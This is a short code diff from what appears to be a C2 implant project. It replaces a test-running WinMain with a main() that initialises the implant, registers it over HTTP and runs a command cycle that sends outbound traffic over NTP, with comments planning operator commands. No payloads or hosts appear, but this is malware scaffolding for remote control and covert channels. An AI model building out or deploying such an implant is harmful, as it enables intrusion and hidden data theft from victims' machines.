@@ -35,7 +35,7 @@
 #include "tests/test.h"
 #include "lifecycle/comms.h"
 #include "data/msgpack/msgpack.h"
-
+#include "data/control/c2.h"
 int temp_loop() {
     
     //note - do a while not registered?
@@ -86,13 +86,34 @@ int temp_loop() {
     }
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    std::cout << "hello" << std::endl;
+//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+//    std::cout << "hello" << std::endl;
+//
+//    //for debugging/sanity check, run all tests first. Remove for production use.
+//    test_all();
+//
+//    temp_loop();
+//
+//    return 0;
+//}
 
-    //for debugging/sanity check, run all tests first. Remove for production use.
-    test_all();
+int main() {
+    C2Implant::init();
+    //register implant, choose any protocol that's included...
+    C2Implant::register_implant(InMethod::HTTP);
+    //ex, start cycle, with 
+    //GET on http, POST on NTP
+    C2Implant::cycle(InMethod::HTTP, OutMethod::NTP);
 
-    temp_loop();
+    /*
+    Add 2 commands.
+
+    strat-get: sets the get strat, i.e. `strat-get <name_of_strat>`
+    strat-post: sets the post strat, i.e. `strat-post <name_of_strat>`
+
+    For now, hardcoded logic is fine I guess.
+
+    */
 
     return 0;
 }
